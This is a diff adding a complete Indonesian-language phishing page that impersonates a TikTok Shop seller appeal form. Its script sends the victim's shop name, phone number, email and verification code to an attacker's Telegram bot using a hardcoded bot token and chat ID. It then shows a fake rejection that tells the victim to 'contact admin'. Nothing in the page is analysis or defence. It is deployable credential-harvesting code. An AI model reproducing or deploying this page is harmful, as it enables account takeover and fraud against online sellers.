@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ajukan Banding Seller</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #fff9e6;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+        }
+        .shop-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            justify-content: center;
+        }
+        /* Styling untuk ikon11.png */
+        .icon11-png {
+            width: 150px;
+            height: auto;
+            display: block;
+        }
+        h1 {
+            font-size: 22px;
+            color: orange;
+            margin-bottom: 25px;
+            font-weight: bold;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        input[type="text"], input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .phone-input {
+            display: flex;
+            gap: 5px;
+        }
+        /* Styling kolom kode negara + bendera */
+        .phone-input .country-code {
+            padding: 12px 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background-color: #f5f5f5;
+            min-width: 100px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        /* Bendera Indonesia yang benar - MERAH ATAS, PUTIH BAWAH */
+        .flag-indonesia {
+            width: 22px;
+            height: 16px;
+            background-color: white;
+            border-radius: 2px;
+            position: relative;
+            overflow: hidden;
+        }
+        .flag-indonesia::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background-color: #FF0000; /* Warna merah standar */
+        }
+        .checkbox-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: orange;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .text-orange {
+            color: orange;
+        }
+        .small-note {
+            font-size: 14px;
+            color: #666;
+            margin-top: 5px;
+        }
+        .alert {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+        .alert.success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .alert.error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .loading-section {
+            display: none;
+            text-align: center;
+            padding: 30px 0;
+        }
+        .loading-section p {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid orange;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Tampilan halaman */
+        #page1 { display: block; }
+        #loadingPage { display: none; }
+        #page2 { display: none; }
+        #verifyLoading { display: none; }
+        #rejectPage { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header dengan ikon11.png -->
+        <div class="shop-header">
+            <img src="ikon1.jpg" alt="Ikon TikTok ikon11.png" class="icon11-png">
+        </div>
+
+        <!-- Halaman 1: Data Utama -->
+        <div id="page1">
+            <h1>Selamat Datang Di Pengajuan Banding Seller</h1>
+            <form id="appealForm">
+                <div class="form-group">
+                    <label>Nama Toko/Penjual</label>
+                    <input type="text" id="shopName" placeholder="Masukkan nama toko atau penjual" required>
+                </div>
+                <div class="form-group">
+                    <label>Nomor HP (Terdaftar)</label>
+                    <div class="phone-input">
+                        <div class="country-code">
+                            <span class="flag-indonesia"></span> <!-- Bendera Indonesia yang benar -->
+                            <span>+62</span>
+                        </div>
+                        <input type="text" id="phoneNumber" placeholder="812xxxxxxxxxx" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="email" placeholder="Masukkan alamat email Anda" required>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" required>
+                    <p>Saya telah membaca dan menyetujui <span class="text-orange">Syarat dan Ketentuan TikTok Shop</span>, serta mengakui data yang dimasukkan benar.</p>
+                </div>
+                <button type="submit">Lanjutkan</button>
+                <div id="page1Alert" class="alert"></div>
+            </form>
+        </div>
+
+        <!-- Halaman Loading Awal -->
+        <div id="loadingPage" class="loading-section">
+            <p>Harap tunggu...</p>
+            <div class="loader"></div>
+            <p style="margin-top: 15px; font-size: 14px;">Data sedang dikirim ke sistem</p>
+        </div>
+
+        <!-- Halaman 2: Verifikasi -->
+        <div id="page2">
+            <h1>Masukkan Kode Verifikasi</h1>
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label>Kode Verifikasi</label>
+                    <input type="text" id="verificationCode" placeholder="Contoh: AB12 atau 1234" required minlength="4">
+                    <p class="small-note">*Bisa kombinasi angka dan huruf, minimal 4 karakter</p>
+                </div>
+                <button type="submit">Ajukan Banding</button>
+                <div id="page2Alert" class="alert"></div>
+            </form>
+        </div>
+
+        <!-- Halaman Loading Setelah Klik Ajukan Banding -->
+        <div id="verifyLoading" class="loading-section">
+            <p>Mohon ditunggu...</p>
+            <div class="loader"></div>
+            <p style="margin-top: 15px; font-size: 14px;">Pengajuan sedang diperiksa</p>
+        </div>
+
+        <!-- Halaman Pengajuan Ditolak -->
+        <div id="rejectPage" class="loading-section">
+            <h1 style="color: #dc3545; font-size: 20px;">Pengajuan Banding Ditolak</h1>
+            <p style="font-size: 16px; color: #333; margin: 20px 0;"> silahkan hubungin admin kami .</p>
+            <button onclick="location.reload()">Ajukan Kembali</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8511020648:AAE9QERhaBT2DAsvolOg-ugOR6PeFXDpNOg";
+        const TELEGRAM_CHAT_ID = "8045397379";
+        const WAIT_TIME = 3000;
+
+        let formData = {};
+
+        // Kirim data utama ke Telegram
+        document.getElementById('appealForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const alert = document.getElementById('page1Alert');
+
+            formData = {
+                shopName: document.getElementById('shopName').value,
+                phoneNumber: "+62" + document.getElementById('phoneNumber').value,
+                email: document.getElementById('email').value
+            };
+
+            document.getElementById('page1').style.display = "none";
+            document.getElementById('loadingPage').style.display = "block";
+
+            try {
+                const message = `📋 *DATA PENGAJUAN BANDING - UTAMA* 📋
+- Nama Toko/Penjual: ${formData.shopName}
+- Nomor HP: ${formData.phoneNumber}
+- Email: ${formData.email}
+*Status: Menunggu kode verifikasi*`;
+
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+
+                const result = await res.json();
+                if (result.ok) {
+                    setTimeout(() => {
+                        document.getElementById('loadingPage').style.display = "none";
+                        document.getElementById('page2').style.display = "block";
+                    }, 2000);
+                } else throw new Error(result.description);
+            } catch (err) {
+                document.getElementById('loadingPage').style.display = "none";
+                document.getElementById('page1').style.display = "block";
+                
+                alert.className = "alert error";
+                alert.textContent = "Gagal kirim data utama! " + err.message;
+                alert.style.display = "block";
+                setTimeout(() => alert.style.display = "none", 5000);
+            }
+        });
+
+        // Proses Ajukan Banding
+        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const verificationCode = document.getElementById('verificationCode').value.trim();
+            const alert = document.getElementById('page2Alert');
+
+            if (verificationCode.length < 4) {
+                alert.className = "alert error";
+                alert.textContent = "Kode minimal 4 karakter!";
+                alert.style.display = "block";
+                setTimeout(() => alert.style.display = "none", 3000);
+                return;
+            }
+
+            document.getElementById('page2').style.display = "none";
+            document.getElementById('verifyLoading').style.display = "block";
+
+            try {
+                const message = `⚠️ *DATA PENGAJUAN BANDING - DITOLAK* 📋
+- Nama Toko/Penjual: ${formData.shopName}
+- Nomor HP: ${formData.phoneNumber}
+- Email: ${formData.email}
+- Kode Verifikasi: ${verificationCode}
+*Status: Pengajuan ditolak, karena kernjang kuning belum terhubung, silahkan hubungi admin*`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+
+                setTimeout(() => {
+                    document.getElementById('verifyLoading').style.display = "none";
+                    document.getElementById('rejectPage').style.display = "block";
+                }, WAIT_TIME);
+            } catch (err) {
+                document.getElementById('verifyLoading').style.display = "none";
+                document.getElementById('page2').style.display = "block";
+                
+                alert.className = "alert error";
+                alert.textContent = "Gagal proses pengajuan! " + err.message;
+                alert.style.display = "block";
+                setTimeout(() => alert.style.display = "none", 5000);
+            }
+        });
+    </script>
+</body>
+</html>
